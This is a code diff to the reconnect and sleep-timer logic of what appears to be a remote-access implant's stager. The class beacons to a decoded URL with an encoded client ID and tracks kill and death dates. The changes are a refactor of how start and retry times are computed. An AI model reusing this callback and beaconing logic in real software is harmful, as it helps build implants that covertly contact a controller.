@@ -62,13 +62,13 @@ import static stager.Stager.hexArray;
 public class SleepTimer implements Runnable {
     
     //Static instance
-    private final Queue<Date> theReconnectTimeList = new LinkedList<Date>();
+    private final Queue<Date> theReconnectTimeList = new LinkedList<>();
     private final String decodedURL;
     private URLConnection theConnection = null;
     private InputStream theInputStream = null;
     private byte[] theClientId;
     private Date deathDateCalendar = null;
-    private Date initialSleepDate = new Date();
+    private Date initialSleepDate = null;
     
     private volatile boolean notified = false;
  
@@ -90,8 +90,12 @@ public class SleepTimer implements Runnable {
     @Override
     public void run() {
             
+        Date initialDate = new Date();
+        if( initialSleepDate != null )
+            initialDate = initialSleepDate;
+        
         Calendar theCalendar = Calendar.getInstance(); 
-        theCalendar.setTime( initialSleepDate );
+        theCalendar.setTime( initialDate );
         theCalendar.add(Calendar.SECOND, 5 );
         Date theDate = theCalendar.getTime();        
                 
@@ -146,7 +150,7 @@ public class SleepTimer implements Runnable {
                 .append("zrefx").append("=").append( encodedByteStr );
 
         //Reconnect list
-        generateTimes();
+        generateTimes( initialDate );
         
         while( theConnection == null ){
 
@@ -174,8 +178,9 @@ public class SleepTimer implements Runnable {
 
                         //Try to connect
                         theInputStream = theConnection.getInputStream();   
-                        
-                        LoaderUtilities.updateKillTime( null );
+                        //Reset the times
+                        if( initialSleepDate != null || deathDateCalendar != null )
+                            LoaderUtilities.resetTimes();
 
                     } catch ( IOException ex) {
                         theConnection = null;
@@ -279,11 +284,11 @@ public class SleepTimer implements Runnable {
     /**
      * 
      */
-    private void generateTimes(){
+    private void generateTimes( Date initialDate ){
                 
         //Create the calendar
         Calendar theCalendar = Calendar.getInstance(); 
-        theCalendar.setTime( initialSleepDate );
+        theCalendar.setTime( initialDate );
 
         //Add 1 Minute
         theCalendar.add( Calendar.MINUTE, 2);
